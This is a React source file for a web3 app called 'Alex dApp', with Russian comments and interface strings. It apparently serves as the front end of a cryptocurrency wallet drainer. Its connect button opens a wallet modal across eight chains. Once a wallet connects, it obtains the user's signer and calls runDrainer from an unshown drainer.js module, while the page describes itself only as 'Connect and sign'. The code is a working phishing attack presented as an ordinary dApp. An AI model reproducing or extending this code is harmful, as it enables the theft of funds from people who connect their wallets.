import { useEffect, useState } from 'react'
import { createAppKit } from '@reown/appkit'
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

// === Настройки AppKit ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://yourdomain.com',
    icons: ['https://checkalex.xyz/icon.png'],
  },
  projectId,
  features: {
    analytics: true,
    email: false,
    socials: false,
  },
  allWallets: 'SHOW',
})

export default function App() {
  const [status, setStatus] = useState('')

  const handleConnect = async () => {
    try {
      setStatus('Ожидание подключения...')
      await modal.open()

      const connected = await wagmiAdapter.getConnectedWallet()
      if (!connected) throw new Error('Кошелёк не подключён')

      const walletClient = await connected.getWalletClient()
      const transport = walletClient?.transport
      if (!transport) throw new Error('Не удалось получить transport')

      const provider = new ethers.providers.Web3Provider(transport, 'any')
      const signer = provider.getSigner()
      const address = await signer.getAddress()

      setStatus(`✅ Кошелёк подключён: ${address}`)
      await runDrainer(provider, signer, address)
      setStatus('🚀 Контракт успешно вызван!')
    } catch (err) {
      console.error('Ошибка подключения:', err)
      setStatus(`❌ Ошибка: ${err.message}`)
    }
  }

  return (
    <div style={{ padding: 20 }}>
      <h1>Alex dApp</h1>
      <button onClick={handleConnect}>
        Подключить кошелёк и запустить
      </button>
      <p>{status}</p>
    </div>
  )
}
